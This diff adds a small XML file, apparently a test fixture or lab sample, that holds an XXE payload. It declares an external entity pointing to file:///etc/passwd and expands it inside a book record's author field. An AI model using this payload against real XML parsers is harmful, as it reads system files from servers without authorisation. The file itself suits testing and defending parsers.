@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE bar [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<book>
+    <author>&xxe;</author>
+    <isbn>11112222333</isbn>
+    <title>Metasploit Unleashed</title>
+</book>
